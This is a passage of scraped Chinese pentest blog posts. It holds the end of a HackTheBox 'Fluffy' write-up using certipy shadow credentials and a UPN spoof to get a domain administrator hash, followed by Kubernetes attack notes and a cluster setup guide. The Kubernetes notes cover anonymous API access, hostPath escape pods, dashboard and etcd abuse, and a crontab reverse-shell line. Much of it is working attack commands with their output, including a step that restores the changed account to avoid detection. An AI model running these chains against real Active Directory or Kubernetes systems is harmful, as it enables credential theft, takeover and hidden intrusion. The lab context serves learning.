Credential with device ID \u0026#39;7ce9744427f5487f82ef4285adb01852\u0026#39; to the Key Credentials for \u0026#39;ca_svc\u0026#39;\r[*] Authenticating as \u0026#39;ca_svc\u0026#39; with the certificate\r[*] Certificate identities:\r[*] No identities found in this certificate\r[*] Using principal: \u0026#39;ca_svc@fluffy.htb\u0026#39;\r[*] Trying to get TGT...\r[*] Got TGT\r[*] Saving credential cache to \u0026#39;ca_svc.ccache\u0026#39;\r[*] Wrote credential cache to \u0026#39;ca_svc.ccache\u0026#39;\r[*] Trying to retrieve NT hash for \u0026#39;ca_svc\u0026#39;\r[*] Restoring the old Key Credentials for \u0026#39;ca_svc\u0026#39;\r[*] Successfully restored the old Key Credentials for \u0026#39;ca_svc\u0026#39;\r[*] NT hash for \u0026#39;ca_svc\u0026#39;: ca0f4f9e9eb8a092addf53bb03fc98c8\rexport KRB5CCNAME=ca_svc.ccache 指定文件 4：以 ca_svc 身份（伪装成 administrator）申请证书\n-k 表示使用 Kerberos 票据（即 ca_svc.ccache）认证； 向 fluffy-DC01-CA 证书服务器申请 User 模板证书：由于 ca_svc 的 UPN 已改为 administrator，CA 会误认为是 administrator 申请证书，最终颁发包含 administrator 身份的证书（如 administrator.pfx）； User 模板通常允许导出私钥，这是后续认证的关键。 certipy req -k -dc-ip \u0026#39;10.10.11.69\u0026#39; -target \u0026#39;DC01.FLUFFY.HTB\u0026#39; -ca \u0026#39;fluffy-DC01-CA\u0026#39; -template \u0026#39;User\u0026#39;\rCertipy v5.0.3 - by Oliver Lyak (ly4k)\r[!] DC host (-dc-host) not specified and Kerberos authentication is used. This might fail\r[*] Requesting certificate via RPC\r[*] Request ID is 15\r[*] Successfully requested certificate\r[*] Got certificate with UPN \u0026#39;administrator\u0026#39;\r[*] Certificate has no object SID\r[*] Try using -sid to set the object SID or see the wiki for more details\r[*] Saving certificate and private key to \u0026#39;administrator.pfx\u0026#39;\r[*] Wrote certificate and private key to \u0026#39;administrator.pfx\u0026#39; 5：用途：将 ca_svc 的 UPN 还原为原始值\n攻击完成后清理痕迹，避免管理员发现 ca_svc 的 UPN 被篡改； 若不还原，可能触发日志告警或被安全工具检测。 certipy account -u \u0026#39;p.agila@fluffy.htb\u0026#39; -p \u0026#39;prometheusx-303\u0026#39; -dc-ip \u0026#39;10.10.11.69\u0026#39; -upn \u0026#39;ca_svc@fluffy.htb\u0026#39; -user \u0026#39;ca_svc\u0026#39; update\rCertipy v5.0.3 - by Oliver Lyak (ly4k)\r[*] Updating user \u0026#39;ca_svc\u0026#39;:\ruserPrincipalName : ca_svc@fluffy.htb\r[*] Successfully updated \u0026#39;ca_svc\u0026#39; 6：使用 administrator.pfx 证书认证为域管理员\n通过第 5 步申请的 administrator.pfx 证书（包含私钥）进行 Kerberos 认证； 成功后可获取 administrator 的 NT 哈希或 TGT 票据，直接登录域控或其他高权限资源（如通过 evil-winrm 远程控制域控）。 certipy auth -dc-ip \u0026#39;10.10.11.69\u0026#39; -pfx \u0026#39;administrator.pfx\u0026#39; -username \u0026#39;administrator\u0026#39; -domain \u0026#39;fluffy.htb\u0026#39;\r[*] Certificate identities:\r[*] SAN UPN: \u0026#39;administrator\u0026#39;\r[*] Using principal: \u0026#39;administrator@fluffy.htb\u0026#39;\r[*] Trying to get TGT...\r[*] Got TGT\r[*] Saving credential cache to \u0026#39;administrator.ccache\u0026#39;\r[*] Wrote credential cache to \u0026#39;administrator.ccache\u0026#39;\r[*] Trying to retrieve NT hash for \u0026#39;administrator\u0026#39;\r[*] Got hash for \u0026#39;administrator@fluffy.htb\u0026#39;: aad3b435b51404eeaad3b435b51404ee:8da83a3fa618b6e3a00e93f676c92a6e evil登录拿到ROOT\nevil-winrm -u administrator -H 8da83a3fa618b6e3a00e93f676c92a6e -i 10.10.11.69\n整体攻击逻辑（核心链） # 权限准备：p.agila 需对 ca_svc 有 GenericWrite 或 WriteProperty 权限（用于修改 UPN 和添加影子凭据）； 身份伪装：修改 ca_svc 的 UPN 为 administrator，欺骗 CA 服务器； 凭据注入：为 ca_svc 添加影子凭据，获取认证用的 Kerberos 票据； 证书申请：利用伪装身份和影子凭据，申请 administrator 的高权限证书； 权限提升：用证书认证为 administrator，实现域管理员权限接管； 痕迹清理：还原 ca_svc 的 UPN，降低被发现的概率。 ","date":"2 September 2025","externalUrl":null,"permalink":"/posts/fluffy-htb-w/","section":"Posts","summary":"","title":"fluffy-htb","type":"posts"},{"content":"","date":"2 September 2025","externalUrl":null,"permalink":"/tags/xwiki/","section":"Tags","summary":"","title":"Xwiki","type":"tags"},{"content":"","date":"31 August 2025","externalUrl":null,"permalink":"/tags/k8s/","section":"Tags","summary":"","title":"K8s","type":"tags"},{"content":" K8s-3-未授权访问 # K8S集群渗透 # 确保都running不然实验不行而且版本要合适\n注意：k8s里面的pod采用的是yaml语法 docker采用dockerfile\n你攻击的都是node节点主机，但是你要攻击的是master所以用到污点（taint）用于限制哪些Pod可以被调度到某一个节点（部署到master上）然后逃逸获得master权限\n1：相关命令-寻找污点 # #查看pod归属\rkubectl get pods -o wide\r#查看目标node污点\rkubectl describe nodes master\r#查看目标污点并筛选\rkubectl describe node master | grep \u0026#39;Taints\u0026#39; -A 5\r#清除目标node污点\rkubectl taint nodes debian node-role.kubernetes.io/master:NoSchedule-\rNoSchedule：表示不允许 Pod 被自动调度到带有此污点的节点上。只有当 Pod 具有与污点匹配的容忍度时，才能在这些节点上调度 Pod。 所以你放不到Master上面 当你在master构建一个镜像其他IP都能访问因为他做了负载均衡-一般来说你拿下一台主机对应哪台IP-但是K8S可能进去会懵逼\n2：靶场实战 # 默认设计：API Server 仅暴露于内网\r1：kubectl create clusterrolebinding system:anonymous --clusterrole=cluster-admin --user=system:anonymous 打开6443默认API访问\rhttps://192.168.139.130:6443/api/v1/namespaces/default/pods/\rPOST：{\u0026#34;apiVersion\u0026#34;:\u0026#34;v1\u0026#34;,\u0026#34;kind\u0026#34;:\u0026#34;Pod\u0026#34;,\u0026#34;metadata\u0026#34;:{\u0026#34;annotations\u0026#34;:{\u0026#34;kubectl.kubernetes.io/last-applied-configuration\u0026#34;:\u0026#34;{\\\u0026#34;apiVersion\\\u0026#34;:\\\u0026#34;v1\\\u0026#34;,\\\u0026#34;kind\\\u0026#34;:\\\u0026#34;Pod\\\u0026#34;,\\\u0026#34;metadata\\\u0026#34;:{\\\u0026#34;annotations\\\u0026#34;:{},\\\u0026#34;name\\\u0026#34;:\\\u0026#34;test02\\\u0026#34;,\\\u0026#34;namespace\\\u0026#34;:\\\u0026#34;default\\\u0026#34;},\\\u0026#34;spec\\\u0026#34;:{\\\u0026#34;containers\\\u0026#34;:[{\\\u0026#34;image\\\u0026#34;:\\\u0026#34;nginx:1.14.2\\\u0026#34;,\\\u0026#34;name\\\u0026#34;:\\\u0026#34;test02\\\u0026#34;,\\\u0026#34;volumeMounts\\\u0026#34;:[{\\\u0026#34;mountPath\\\u0026#34;:\\\u0026#34;/host\\\u0026#34;,\\\u0026#34;name\\\u0026#34;:\\\u0026#34;host\\\u0026#34;}]}],\\\u0026#34;volumes\\\u0026#34;:[{\\\u0026#34;hostPath\\\u0026#34;:{\\\u0026#34;path\\\u0026#34;:\\\u0026#34;/\\\u0026#34;,\\\u0026#34;type\\\u0026#34;:\\\u0026#34;Directory\\\u0026#34;},\\\u0026#34;name\\\u0026#34;:\\\u0026#34;host\\\u0026#34;}]}}\\n\u0026#34;},\u0026#34;name\u0026#34;:\u0026#34;test02\u0026#34;,\u0026#34;namespace\u0026#34;:\u0026#34;default\u0026#34;},\u0026#34;spec\u0026#34;:{\u0026#34;containers\u0026#34;:[{\u0026#34;image\u0026#34;:\u0026#34;nginx:1.14.2\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;test02\u0026#34;,\u0026#34;volumeMounts\u0026#34;:[{\u0026#34;mountPath\u0026#34;:\u0026#34;/host\u0026#34;,\u0026#34;name\u0026#34;:\u0026#34;host\u0026#34;}]}],\u0026#34;volumes\u0026#34;:[{\u0026#34;hostPath\u0026#34;:{\u0026#34;path\u0026#34;:\u0026#34;/\u0026#34;,\u0026#34;type\u0026#34;:\u0026#34;Directory\u0026#34;},\u0026#34;name\u0026#34;:\u0026#34;host\u0026#34;}]}}\r2：应用部署漏洞\rkubectl create deployment struts --image=vulhub/struts2:2.3.28 创建镜像\rkubectl expose deploy struts --port=8080 --target-port=8080 --type=NodePort 为上面创建的 struts Deployment 暴露一个 Service，使外部（或集群内其他服务）可以访问该应用。\rkubectl get pod,svc 查看当前集群中所有 Pod 和 Service 的状态信息。\r绕过 多创建几次放到master节点上\rcat \u0026gt; x.yaml \u0026lt;\u0026lt; EOF\rapiVersion: v1\rkind: Pod\rmetadata:\rname: xxx\rspec:\rtolerations:\r- key: node-role.kubernetes.io/master\roperator: Exists\reffect: NoSchedule\rcontainers:\r- name: xxx\rimage: ubuntu:18.04\rcommand: [\u0026#34;/bin/sleep\u0026#34;, \u0026#34;3650d\u0026#34;]\rvolumeMounts:\r- name: master\rmountPath: /master\rvolumes:\r- name: master\rhostPath:\rpath: /\rtype: Directory\rEOF 检测struct2漏洞然后上传webshell\n连接上去 注意这里哥斯拉：webshell是没有交互的\n[root@master-1 ~]# kubectl cp kubectl struts-6555fd8cf8-qbjx4:/ [root@master-1 ~]# kubectl cp cdk_linux_amd64 struts-6555fd8cf8-qbjx4:/ 放上去\n使用cdk evaluate扫描发现APIserver未授权\ncurl -k https://192.168.79.131:6443/api/v1/namespaces/default/pods\n可以获取pod信息我们可以上传一个绕过node节点创建到master的yaml文件\n绕过交互如叫你输入username和password它可以跳过\n./kubectl \u0026ndash;server=https://192.168.79.131:6443 \u0026ndash;insecure-skip-tls-verify=true \u0026ndash;username=a \u0026ndash;password=a create -f ./x.yaml\n创建成功 多创建几次\n成功创建到master节点我们进去开始逃逸\n./kubectl \u0026ndash;server=https://192.168.79.131:6443 \u0026ndash;insecure-skip-tls-verify=true \u0026ndash;username=a \u0026ndash;password=a create -f ./x.yaml\n创建成功 多创建几次\n成功创建到master节点我们进去开始逃逸\n./kubectl \u0026ndash;server=https://192.168.1.131:6443 \u0026ndash;insecure-skip-tls-verify=true \u0026ndash;username=a \u0026ndash;password=a exec xxx1 \u0026ndash; bash -c \u0026ldquo;cat /master/root/flag\u0026rdquo;\n拿下后写入计划任务\n也可以利用节点泄漏的config横向移动节点\n./kubectl -s https://10.96.0.1:443/ \u0026ndash;kubeconfig=config \u0026ndash;insecure-skip-tls-verify=true get nodes\n./kubectl apply -f test.yaml -n default \u0026ndash;kubeconfig=config\n./kubectl -n default \u0026ndash;kubeconfig=config exec xiaodisec \u0026ndash; bash -c \u0026ldquo;ls /mnt/root\u0026rdquo;\n","date":"31 August 2025","externalUrl":null,"permalink":"/posts/k8s3/","section":"Posts","summary":"","title":"K8s-3-靶场渗透","type":"posts"},{"content":" K8s-2-未授权访问 # K8S集群安装配置在上个博客\nK8S集群渗透 # 确保都running不然实验不行而且版本要合适\n注意：k8s里面的pod采用的是yaml语法 docker采用dockerfile\n1：Dashboard未授权访问8001 # 默认端口：8001\r配置不当导致dashboard未授权访问,通过dashboard可以控制整个集群。\rkubernetes dashboard的未授权其实分两种情况：\r一种是在本身就存在着不需要登录的http接口，但接口本身并不会暴露出来，如接口被暴露在外，就会导致dashboard未授权。另外一种情况则是开发嫌登录麻烦，修改了配置文件，使得安全接口https的dashboard页面可以跳过登录。\r*复现利用：\r*用户开启enable-skip-login时可以在登录界面点击跳过登录进dashboard\r*Kubernetes-dashboard绑定cluster-admin（拥有管理集群的最高权限）\r1、安装：https://blog.csdn.net/justlpf/article/details/130718774\r2、启动：kubectl create -f recommended.yaml --valid=false 这里我用node的IP进去了 3、卸载：kubectl delete -f recommended.yaml\r4、查看：kubectl get pod,svc -n kubernetes-dashboard\r5、利用：新增Pod后续同前面利用一致\r*找到暴露面板-\u0026gt;dashboard跳过-创建或上传pod-\u0026gt;进入执行-利用挂载逃逸\rrecommended.yaml\r# Copyright 2017 The Kubernetes Authors.\r#\r# Licensed under the Apache License, Version 2.0 (the \u0026#34;License\u0026#34;);\r# you may not use this file except in compliance with the License.\r# You may obtain a copy of the License at\r#\r# http://www.apache.org/licenses/LICENSE-2.0\r#\r# Unless required by applicable law or agreed to in writing, software\r# distributed under the License is distributed on an \u0026#34;AS IS\u0026#34; BASIS,\r# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\r# See the License for the specific language governing permissions and\r# limitations under the License.\rapiVersion: v1\rkind: Namespace\rmetadata:\rname: kubernetes-dashboard\r---\rapiVersion: v1\rkind: ServiceAccount\rmetadata:\rlabels:\rk8s-app: kubernetes-dashboard\rname: kubernetes-dashboard\rnamespace: kubernetes-dashboard\r---\rkind: Service\rapiVersion: v1\rmetadata:\rlabels:\rk8s-app: kubernetes-dashboard\rname: kubernetes-dashboard\rnamespace: kubernetes-dashboard\rspec:\rtype: NodePort\rports:\r- port: 443\rtargetPort: 8443\rnodePort: 30009\rselector:\rk8s-app: kubernetes-dashboard\r---\rapiVersion: v1\rkind: Secret\rmetadata:\rlabels:\rk8s-app: kubernetes-dashboard\rname: kubernetes-dashboard-certs\rnamespace: kubernetes-dashboard\rtype: Opaque\r---\rapiVersion: v1\rkind: Secret\rmetadata:\rlabels:\rk8s-app: kubernetes-dashboard\rname: kubernetes-dashboard-csrf\rnamespace: kubernetes-dashboard\rtype: Opaque\rdata:\rcsrf: \u0026#34;\u0026#34;\r---\rapiVersion: v1\rkind: Secret\rmetadata:\rlabels:\rk8s-app: kubernetes-dashboard\rname: kubernetes-dashboard-key-holder\rnamespace: kubernetes-dashboard\rtype: Opaque\r---\rkind: ConfigMap\rapiVersion: v1\rmetadata:\rlabels:\rk8s-app: kubernetes-dashboard\rname: kubernetes-dashboard-settings\rnamespace: kubernetes-dashboard\r---\rkind: Role\rapiVersion: rbac.authorization.k8s.io/v1\rmetadata:\rlabels:\rk8s-app: kubernetes-dashboard\rname: kubernetes-dashboard\rnamespace: kubernetes-dashboard\rrules:\r# Allow Dashboard to get, update and delete Dashboard exclusive secrets.\r- apiGroups: [\u0026#34;\u0026#34;]\rresources: [\u0026#34;secrets\u0026#34;]\rresourceNames: [\u0026#34;kubernetes-dashboard-key-holder\u0026#34;, \u0026#34;kubernetes-dashboard-certs\u0026#34;, \u0026#34;kubernetes-dashboard-csrf\u0026#34;]\rverbs: [\u0026#34;get\u0026#34;, \u0026#34;update\u0026#34;, \u0026#34;delete\u0026#34;]\r# Allow Dashboard to get and update \u0026#39;kubernetes-dashboard-settings\u0026#39; config map.\r- apiGroups: [\u0026#34;\u0026#34;]\rresources: [\u0026#34;configmaps\u0026#34;]\rresourceNames: [\u0026#34;kubernetes-dashboard-settings\u0026#34;]\rverbs: [\u0026#34;get\u0026#34;, \u0026#34;update\u0026#34;]\r# Allow Dashboard to get metrics.\r- apiGroups: [\u0026#34;\u0026#34;]\rresources: [\u0026#34;services\u0026#34;]\rresourceNames: [\u0026#34;heapster\u0026#34;, \u0026#34;dashboard-metrics-scraper\u0026#34;]\rverbs: [\u0026#34;proxy\u0026#34;]\r- apiGroups: [\u0026#34;\u0026#34;]\rresources: [\u0026#34;services/proxy\u0026#34;]\rresourceNames: [\u0026#34;heapster\u0026#34;, \u0026#34;http:heapster:\u0026#34;, \u0026#34;https:heapster:\u0026#34;, \u0026#34;dashboard-metrics-scraper\u0026#34;, \u0026#34;http:dashboard-metrics-scraper\u0026#34;]\rverbs: [\u0026#34;get\u0026#34;]\r---\rkind: ClusterRole\rapiVersion: rbac.authorization.k8s.io/v1\rmetadata:\rlabels:\rk8s-app: kubernetes-dashboard\rname: kubernetes-dashboard\rrules:\r# Allow Metrics Scraper to get metrics from the Metrics server\r- apiGroups: [\u0026#34;metrics.k8s.io\u0026#34;]\rresources: [\u0026#34;pods\u0026#34;, \u0026#34;nodes\u0026#34;]\rverbs: [\u0026#34;get\u0026#34;, \u0026#34;list\u0026#34;, \u0026#34;watch\u0026#34;]\r---\rapiVersion: rbac.authorization.k8s.io/v1\rkind: RoleBinding\rmetadata:\rlabels:\rk8s-app: kubernetes-dashboard\rname: kubernetes-dashboard\rnamespace: kubernetes-dashboard\rroleRef:\rapiGroup: rbac.authorization.k8s.io\rkind: Role\rname: kubernetes-dashboard\rsubjects:\r- kind: ServiceAccount\rname: kubernetes-dashboard\rnamespace: kubernetes-dashboard\r---\rapiVersion: rbac.authorization.k8s.io/v1\rkind: ClusterRoleBinding\rmetadata:\rname: kubernetes-dashboard\rroleRef:\rapiGroup: rbac.authorization.k8s.io\rkind: ClusterRole\rname: cluster-admin\rsubjects:\r- kind: ServiceAccount\rname: kubernetes-dashboard\rnamespace: kubernetes-dashboard\r---\rkind: Deployment\rapiVersion: apps/v1\rmetadata:\rlabels:\rk8s-app: kubernetes-dashboard\rname: kubernetes-dashboard\rnamespace: kubernetes-dashboard\rspec:\rreplicas: 1\rrevisionHistoryLimit: 10\rselector:\rmatchLabels:\rk8s-app: kubernetes-dashboard\rtemplate:\rmetadata:\rlabels:\rk8s-app: kubernetes-dashboard\rspec:\rsecurityContext:\rseccompProfile:\rtype: RuntimeDefault\rcontainers:\r- name: kubernetes-dashboard\rimage: kubernetesui/dashboard:v2.5.0\rimagePullPolicy: Always\rports:\r- containerPort: 8443\rprotocol: TCP\rargs:\r- --enable-skip-login\r- --auto-generate-certificates\r- --namespace=kubernetes-dashboard\r# Uncomment the following line to manually specify Kubernetes API server Host\r# If not specified, Dashboard will attempt to auto discover the API server and connect\r# to it. Uncomment only if the default does not work.\r# - --apiserver-host=http://my-address:port\rvolumeMounts:\r- name: kubernetes-dashboard-certs\rmountPath: /certs\r# Create on-disk volume to store exec logs\r- mountPath: /tmp\rname: tmp-volume\rlivenessProbe:\rhttpGet:\rscheme: HTTPS\rpath: /\rport: 8443\rinitialDelaySeconds: 30\rtimeoutSeconds: 30\rsecurityContext:\rallowPrivilegeEscalation: false\rreadOnlyRootFilesystem: true\rrunAsUser: 1001\rrunAsGroup: 2001\rvolumes:\r- name: kubernetes-dashboard-certs\rsecret:\rsecretName: kubernetes-dashboard-certs\r- name: tmp-volume\remptyDir: {}\rserviceAccountName: kubernetes-dashboard\rnodeSelector:\r\u0026#34;kubernetes.io/os\u0026#34;: linux\r# Comment the following tolerations if Dashboard must not be deployed on master\rtolerations:\r- key: node-role.kubernetes.io/master\reffect: NoSchedule\r---\rkind: Service\rapiVersion: v1\rmetadata:\rlabels:\rk8s-app: dashboard-metrics-scraper\rname: dashboard-metrics-scraper\rnamespace: kubernetes-dashboard\rspec:\rports:\r- port: 8000\rtargetPort: 8000\rselector:\rk8s-app: dashboard-metrics-scraper\r---\rkind: Deployment\rapiVersion: apps/v1\rmetadata:\rlabels:\rk8s-app: dashboard-metrics-scraper\rname: dashboard-metrics-scraper\rnamespace: kubernetes-dashboard\rspec:\rreplicas: 1\rrevisionHistoryLimit: 10\rselector:\rmatchLabels:\rk8s-app: dashboard-metrics-scraper\rtemplate:\rmetadata:\rlabels:\rk8s-app: dashboard-metrics-scraper\rspec:\rsecurityContext:\rseccompProfile:\rtype: RuntimeDefault\rcontainers:\r- name: dashboard-metrics-scraper\rimage: kubernetesui/metrics-scraper:v1.0.7\rports:\r- containerPort: 8000\rprotocol: TCP\rlivenessProbe:\rhttpGet:\rscheme: HTTP\rpath: /\rport: 8000\rinitialDelaySeconds: 30\rtimeoutSeconds: 30\rvolumeMounts:\r- mountPath: /tmp\rname: tmp-volume\rsecurityContext:\rallowPrivilegeEscalation: false\rreadOnlyRootFilesystem: true\rrunAsUser: 1001\rrunAsGroup: 2001\rserviceAccountName: kubernetes-dashboard\rnodeSelector:\r\u0026#34;kubernetes.io/os\u0026#34;: linux\r# Comment the following tolerations if Dashboard must not be deployed on master\rtolerations:\r- key: node-role.kubernetes.io/master\reffect: NoSchedule\rvolumes:\r- name: tmp-volume\remptyDir: {} 点击跳过可以直接进去记得换浏览器\n点击PODS -\u0026gt; 点击加号上传恶意pods\ntest.yaml\rapiVersion: v1\rkind: Pod\rmetadata:\rname: hajimedie\rspec:\rcontainers:\r- image: nginx\rname: hajimedie\rvolumeMounts:\r- mountPath: /mnt\rname: test-volume\rvolumes:\r- name: test-volume\rhostPath:\rpath: / 成功后进入带有恶意挂载逃逸的shell界面\n做完实验删除kubectl delete -f recommended.yaml\n2：Proxy代理未授权 # 当运维人员需要某个环境暴露端口或者IP时，会用到Kubectl Proxy\r使用kubectl proxy命令就可以使API server监听在本地的xxxx端口上\r环境搭建：\rkubectl --insecure-skip-tls-verify proxy --accept-hosts=^.*$ --address=0.0.0.0 --port=8009\r把APISERBER代理带8009端口了 就和第一个博客的APIserver未授权攻击一样了\n接下来就是上传pods 拿shell逃逸和第一个博客一样了\n3：Config鉴权文件泄漏 # 攻击者通过Webshell、Github等拿到了K8s配置的Config文件，操作集群，从而接管所有容器。K8s configfile作为K8s集群的管理凭证，其中包含有关K8s集群的详细信息(API Server、登录凭证)。\r默认位置\r/root/.kube/config\r[root@master-1 .kube]# ls -al\rtotal 16\rdrwxr-xr-x. 4 root root 51 Aug 27 23:25 .\rdr-xr-x---. 6 root root 4096 Aug 28 23:41 ..\rdrwxr-x---. 3 root root 23 Aug 27 23:25 cache\r-rw-------. 1 root root 5450 Aug 27 23:25 config\rdrwxr-x---. 3 root root 4096 Aug 28 23:38 http-cache\r[root@master-1 .kube]# kubectl -s https://192.168.79.131:6443/ \u0026ndash;kubeconfig=config \u0026ndash;insecure-skip-tls-verify=true get nodes\n然后用上传pods 登录 挂载逃逸\nkubectl -s https://192.168.79.131:6443/ \u0026ndash;kubeconfig=config \u0026ndash;insecure-skip-tls-verify=true apply -f test.yaml -n default \u0026ndash;kubeconfig=config\nkubectl -s https://192.168.79.131:6443/ \u0026ndash;kubeconfig=config \u0026ndash;insecure-skip-tls-verify=true exec -it xiaodisec bash -n default \u0026ndash;kubeconfig=config\n反弹\necho -e \u0026ldquo;* * * * * root bash -i \u0026gt;\u0026amp; /dev/tcp/192.168.79.131/4444 0\u0026gt;\u0026amp;1\\n\u0026rdquo; \u0026raquo; /mnt/etc/crontab\n4：etcd未授权访问 # etcd 保存了整个集群的状态\r/etc/kubernetes/manifests/etcd.yaml\rsystemctl restart kubelet.service 重启\r--client-cert-auth 设置为false即可不用验证 没有暴露就用SSRF --listen-cilent-url=后面IP如果是127.0.0.1表示只允许内部访问 但是SSRF可绕过\r三种方法：\r第一种：没有配置指定--client-cert-auth 参数打开证书校验，暴露在外Etcd服务存在未授权访问风险。\r-暴露外部可以访问，直接未授权访问获取secrets和token利用\r第二种：在打开证书校验选项后，通过本地127.0.0.1:2379可免认证访问Etcd服务，但通过其他地址访问要携带cert进行认证访问，一般配合ssrf或其他利用，较为鸡肋。\r-只能本地访问，直接未授权访问获取secrets和token利用\r第三种：实战中在安装k8s默认的配置2379只会监听本地，如果访问没设置0.0.0.0暴露，那么也就意味着最多就是本地访问，不能公网访问，只能配合ssrf或其他。\r-只能本地访问，利用ssrf或其他进行获取secrets和token利用\r*复现利用：\r*暴露etcd未授权-\u0026gt;获取secrets\u0026amp;token-\u0026gt;通过访问API-Server接管\r*SSRF绕限制访问-\u0026gt;获取secrets\u0026amp;token-\u0026gt;通过token访问API-Server\r*V2/V3版本利用参考：https://www.cnblogs.com/qtzd/p/k8s_etcd.html ./etcdctl \u0026ndash;endpoints=192.168.79.131:23791 get / \u0026ndash;prefix \u0026ndash;keys-only | grep /secrets/\n读取service account token:\n./etcdctl \u0026ndash;endpoints=192.168.79.131:23791 get / \u0026ndash;prefix \u0026ndash;keys-only | grep /secrets/kube-system/clusterrole\n./etcdctl \u0026ndash;endpoints=192.168.79.131:23791 get /registry/secrets/kube-system/clusterrole-aggregation-controller-token-jdp5z\n通过token访问API-Server，获取集群的权限：\nkubectl \u0026ndash;insecure-skip-tls-verify -s https://192.168.79.131:6443/ \u0026ndash;token=\u0026ldquo;xxxxx\u0026rdquo; -n kube-system get pods\n","date":"28 August 2025","externalUrl":null,"permalink":"/posts/k8s2/","section":"Posts","summary":"","title":"K8s-2-未授权访问-proxy","type":"posts"},{"content":" K8s-1-未授权访问 # K8S集群安装配置\n安装K8S环境一共三台主机一台终端两台节点\r# 在 master 节点上执行\rhostnamectl set-hostname master-1\r# 在第一个 worker 节点上执行\rhostnamectl set-hostname node1\r# 在第二个 worker 节点上执行\rhostnamectl set-hostname node2\rcat \u0026lt;\u0026lt;EOF \u0026gt;\u0026gt;/etc/hosts\r192.168.79.141 master-1\r192.168.79.140 node1\r192.168.79.139 node2\rEOF\ryum remove -y docker-ce docker-ce-cli containerd.io\rrm -rf /var/lib/docker\rrm -rf /var/lib/containerd\ryum install -y docker-ce-18.09.9-3.el7 docker-ce-cli-18.09.9-3.el7 containerd.io\rsystemctl disable firewalld\rsystemctl stop firewalld\rsetenforce 0\rsed -i \u0026#39;s/SELINUX=permissive/SELINUX=disabled/\u0026#39; /etc/sysconfig/selinux\rsed -i \u0026#34;s/SELINUX=enforcing/SELINUX=disabled/g\u0026#34; /etc/selinux/config\rswapoff -a\rsed -i \u0026#39;s/.*swap.*/#\u0026amp;/\u0026#39; /etc/fstab\rcat \u0026lt;\u0026lt;EOF \u0026gt; /etc/sysctl.d/k8s.conf\rnet.bridge.bridge-nf-call-ip6tables = 1\rnet.bridge.bridge-nf-call-iptables = 1\rEOF\r# 添加 Kubernetes 的阿里云 yum 源\rcat \u0026lt;\u0026lt;EOF \u0026gt; /etc/yum.repos.d/kubernetes.repo\r[kubernetes]\rname=Kubernetes\rbaseurl=https://mirrors.aliyun.com/kubernetes/yum/repos/kubernetes-el7-x86_64/\renabled=1\rgpgcheck=1\rrepo_gpgcheck=1\rgpgkey=https://mirrors.aliyun.com/kubernetes/yum/doc/yum-key.gpg https://mirrors.aliyun.com/kubernetes/yum/doc/rpm-package-key.gpg\rEOF\r# 安装指定版本的 kubeadm, kubelet, kubectl\ryum install -y kubectl-1.16.0-0 kubeadm-1.16.0-0 kubelet-1.16.0-0\r# 设置 kubelet 开机自启并立即启动（此时会报错，正常）\rsystemctl enable kubelet \u0026amp;\u0026amp; systemctl start kubelet\rmaster执行\r# 初始化控制平面\rkubeadm init --image-repository registry.aliyuncs.com/google_containers --kubernetes-version v1.16.0 --apiserver-advertise-address 192.168.79.141 --pod-network-cidr=10.244.0.0/16 --token-ttl 0\r# 初始化成功后，配置 kubectl 的认证文件\rmkdir -p $HOME/.kube\rsudo cp -i /etc/kubernetes/admin.conf $HOME/.kube/config\rsudo chown $(id -u):$(id -g) $HOME/.kube/config\r[root@master-1 ~]# kubectl get nodes\rNAME STATUS ROLES AGE VERSION\rmaster-1 NotReady master 2m4s v1.16.0\r[root@master-1 ~]# node--------\r为什么 Kubernetes 需要网络插件（如 Flannel/Calico）？\rKubernetes 本身不提供网络功能，它依赖 CNI（Container Network Interface）插件 来实现 Pod 之间的通信。\rkubectl get nodes\rcurl -O https://raw.githubusercontent.com/flannel-io/flannel/v0.12.0/Documentation/kube-flannel.yml\rkubectl apply -f kube-flannel.yml\rkubectl get daemonset -n kube-system\rkubectl get pods -n kube-system -o wide | grep flannel\rwatch kubectl get pods -n kube-system\rkubeadm token list看token\ropenssl x509 -pubkey -in /etc/kubernetes/pki/ca.crt | openssl rsa -pubin -outform der 2\u0026gt;/dev/null | openssl dgst -sha256 -hex | sed \u0026#39;s/^.* //\u0026#39;看hash\rnode节点执行\rkubectl get pods -n kube-system\rkubeadm join 192.168.79.141:6443 \\\r--token dsfgdi.t1iz8mqhbh54o9qm \\\r--discovery-token-ca-cert-hash sha256:e70c708dab7a60164b6023d26e57446f2a0cd21a4985d85554fa8642d9b33b8f\r节点加入集群❌ 不影响节点加入依赖 kubelet和 kube-proxy，不依赖 Calico 的 BGP\rPod 网络互通✅ ​​影响​​Calico 默认依赖 BGP 或 IPIP 实现跨节点 Pod 通信\rkubectl exec✅ ​​影响​​需要跨节点网络可达\rService 网络❌ 不影响由 kube-proxy处理，不依赖 Calico\rsystemctl restart kubelet\rkubectl get nodes kubectl delete pods -n kube-system -l app=flannel\rwatch kubectl get pods -n kube-system -l app=flannel\r重置Calico\r# 彻底删除 Calico\rkubectl delete -f calico-3.9.2.yaml\rrm -rf /etc/cni/net.d/calico-kubeconfig\r# 清理网络接口\rip link delete cali0 2\u0026gt;/dev/null || true\rip link delete tunl0 2\u0026gt;/dev/null || true\r# 重新安装\rkubectl apply -f calico-3.9.2.yaml\r各种问题后成功的配置-----------------\r关键\rcontainerd config default \u0026gt; /etc/containerd/config.toml\r#修改文件\rhttps://blog.csdn.net/m0_68472908/article/details/146534195 这个博客的和我上面的结合版本修改上面版本\rvim /etc/containerd/config.toml\rSystemdCgroup = false 改为 SystemdCgroup = true\rsandbox_image = \u0026#34;k8s.gcr.io/pause:3.6\u0026#34; 改为：\rsandbox_image = \u0026#34;registry.aliyuncs.com/google_containers/pause:3.6\u0026#34; docker镜像可能要改\r{\r\u0026#34;registry-mirrors\u0026#34;: [\r\u0026#34;https://docker.hpcloud.cloud\u0026#34;,\r\u0026#34;https://docker.m.daocloud.io\u0026#34;,\r\u0026#34;https://docker.unsee.tech\u0026#34;,\r\u0026#34;https://docker.1panel.live\u0026#34;,\r\u0026#34;http://mirrors.ustc.edu.cn\u0026#34;,\r\u0026#34;https://docker.chenby.cn\u0026#34;,\r\u0026#34;http://mirror.azure.cn\u0026#34;,\r\u0026#34;https://dockerpull.org\u0026#34;,\r\u0026#34;https://dockerhub.icu\u0026#34;,\r\u0026#34;https://hub.rat.dev\u0026#34;\r],\r\u0026#34;exec-opts\u0026#34;: [\u0026#34;native.cgroupdriver=systemd\u0026#34;]\r}\ryum install wget\rwget 